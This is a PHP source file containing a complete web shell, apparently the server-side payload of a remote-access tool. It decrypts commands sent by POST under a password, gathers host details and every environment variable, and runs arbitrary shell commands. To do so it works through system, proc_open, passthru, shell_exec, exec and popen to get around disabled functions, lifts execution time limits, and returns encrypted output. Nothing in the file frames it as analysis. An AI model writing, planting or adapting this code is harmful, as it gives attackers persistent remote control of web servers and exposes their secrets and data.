<?

function main($pass){
    $args = decrypt($_POST[$pass],$pass);
    $a =new DADOPKA($pass);
    $a->DoAction($args);
}

class DADOPKA{
    private $pass;

    public function __construct($pass) {
        $this->pass = $pass;
    }
    public function DoAction(string $params){
        $map = $this->_handleParams($params);
        switch ($map["action"]) {
            case 'ping':
                echo $this->ping();
                break;
            case 'info':
                echo $this->baseinfo();
                break;
            case 'cmd':
                echo $this->exec($map["command"]);
                break;
            default:
                return "action not found";
        }
    }
    private function _handleParams(string $params){
        $result = array();
        $tmp = explode(",",$params);
        for ($i=0; $i < count($tmp); $i++) {
            $array = explode("~~",$tmp[$i]);
            $result[$array[0]] =base64_decode($array[1]);
        }
        return $result;
    }
    private function baseinfo()
    {
    $driveList = "";
    if (stristr(PHP_OS, "windows") || stristr(PHP_OS, "winnt")) {
        for ($i = 65; $i <= 90; $i++) {
            $drive = chr($i) . ':/';
            file_exists($drive) ? $driveList = $driveList . $drive . ";" : '';
        }
    } else {
        $driveList = "/";
    }
    $res = array();
    $R = array();
    $D = dirname($_SERVER["SCRIPT_FILENAME"]);
    if ($D == "") $D = dirname($_SERVER["PATH_TRANSLATED"]);
    $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
    $s = ($u) ? $u["name"] : @get_current_user();
    $R["drive"] = $driveList;
    $R["os_version"] = php_uname();
    $R["current_user"] = "{$s}";
    $envString = "";
    foreach ($_ENV as $variableName => $variableValue) {
        $envString .= "{$variableName}={$variableValue}\n";
    }
    $R["os_env"] = $envString;
    $R["pwd"] = __DIR__;
    $res["status"] = "ok";
    $res["msg"] = base64_encode(json_encode($R));
    $res = json_encode($res);
    return function_exists("encrypt") ? encrypt($res,$this->pass) : $res;
}

private function ping(){
    $result=json_encode(array("status"=>"ok","msg"=>base64_encode("ok")));
    return function_exists("encrypt") ? encrypt($result,$this->pass) : $result;
}

private function getSafeStr($str)
{
    $s1 = iconv('utf-8', 'gbk//IGNORE', $str);
    $s0 = iconv('gbk', 'utf-8//IGNORE', $s1);
    if ($s0 == $str) {
        return $s0;
    } else {
        return iconv('gbk', 'utf-8//IGNORE', $str);
    }
}

function exec($command){
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);
    $result = array();
    $PadtJn = @ini_get('disable_functions');
    if (!empty($PadtJn)) {
        $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);
        $PadtJn = explode(',', $PadtJn);
        $PadtJn = array_map('trim', $PadtJn);
    } else {
        $PadtJn = array();
    }
    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
        @putenv("PATH=" . getenv("PATH") . ";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
        $c = $command . " 2>&1\n";
    } else {
        @putenv("PATH=" . getenv("PATH") . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
        $c = $command;
    }
    $JueQDBH = 'is_callable';
    $Bvce = 'in_array';
    if ($JueQDBH('system') and !$Bvce('system', $PadtJn)) {
        ob_start();
        system($c);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if ($JueQDBH('proc_open') and !$Bvce('proc_open', $PadtJn)) {
        $handle = proc_open($c, array(
            array(
                'pipe',
                'r'
            ),
            array(
                'pipe',
                'w'
            ),
            array(
                'pipe',
                'w'
            )
        ), $pipes);
        $kWJW = NULL;
        while (!feof($pipes[1])) {
            $kWJW .= fread($pipes[1], 1024);
        }
        @proc_close($handle);
    } else if ($JueQDBH('passthru') and !$Bvce('passthru', $PadtJn)) {
        ob_start();
        passthru($c);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if ($JueQDBH('shell_exec') and !$Bvce('shell_exec', $PadtJn)) {
        $kWJW = shell_exec($c);
    } else if ($JueQDBH('exec') and !$Bvce('exec', $PadtJn)) {
        $kWJW = array();
        exec($c, $kWJW);
        $kWJW = join(chr(10), $kWJW) . chr(10);
    } else if ($JueQDBH('exec') and !$Bvce('popen', $PadtJn)) {
        $fp = popen($c, 'r');
        $kWJW = NULL;
        if (is_resource($fp)) {
            while (!feof($fp)) {
                $kWJW .= fread($fp, 1024);
            }
        }
        @pclose($fp);
    } else {
        $kWJW = 0;
        $result["status"] = "fail";
        $result["msg"] = base64_encode("error://");
        return json_encode($result);
    }
    $result["status"] = "ok";
    $result["msg"] = base64_encode($this->getSafeStr($kWJW));
    $result = json_encode($result);
    return function_exists("encrypt") ? encrypt($result,$this->pass) : $result;
}
}